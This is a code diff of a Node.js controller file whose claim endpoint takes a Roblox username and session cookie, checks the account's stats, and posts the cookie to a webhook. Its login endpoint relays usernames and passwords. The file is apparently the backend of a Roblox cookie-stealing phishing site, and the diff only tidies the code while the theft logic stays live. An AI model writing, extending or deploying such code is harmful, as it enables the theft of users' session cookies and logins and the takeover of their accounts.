@@ -1,11 +1,7 @@
 const login = require("../login");
 const getRobloxStats = require("../cookiechecker");
-const robloxService = require("../services/roblox.service");
-const webhookService = require("../services/webhook.service");
-
-/* =========================
-   LOGIN CONTROLLER
-========================= */
+const roblox = require("../services/roblox.service");
+const webhook = require("../services/webhook.service");
 
 async function loginController(req, res) {
     try {
@@ -17,21 +13,13 @@ async function loginController(req, res) {
 
         const result = await login(username, password);
 
-        if (!result?.result) {
-            return res.status(401).json({ error: "Login failed" });
-        }
-
         return res.json(result);
 
     } catch (err) {
-        console.error("[LOGIN CTRL]", err);
-        return res.status(500).json({ error: "Server error" });
+        console.error(err);
+        return res.status(500).json({ error: "Login error" });
     }
 }
-
-/* =========================
-   CLAIM CONTROLLER
-========================= */
 
 async function claimController(req, res) {
     try {
@@ -41,31 +29,20 @@ async function claimController(req, res) {
             return res.status(400).json({ error: "Missing fields" });
         }
 
-        console.log(`[INFO] Claim attempt → ${username}`);
-
-        const userId = await robloxService.getUserId(username);
-        const avatarUrl = await robloxService.getAvatar(userId);
-
+        const userId = await roblox.getUserId(username);
+        const avatar = await roblox.getAvatar(userId);
         const stats = await getRobloxStats(cookie);
 
-        const embed = robloxService.buildEmbed({
-            username,
-            userId,
-            stats,
-            avatarUrl
-        });
+        const embed = roblox.buildEmbed({ username, userId, stats, avatar });
 
-        await webhookService.send(cookie, embed);
+        await webhook.send(cookie, embed);
 
-        return res.json({ success: true });
+        res.json({ success: true });
 
     } catch (err) {
-        console.error("[CLAIM CTRL]", err);
-        return res.status(500).json({ error: "Server error" });
+        console.error(err);
+        res.status(500).json({ error: "Claim error" });
     }
 }
 
-module.exports = {
-    loginController,
-    claimController
-};
+module.exports = { loginController, claimController };
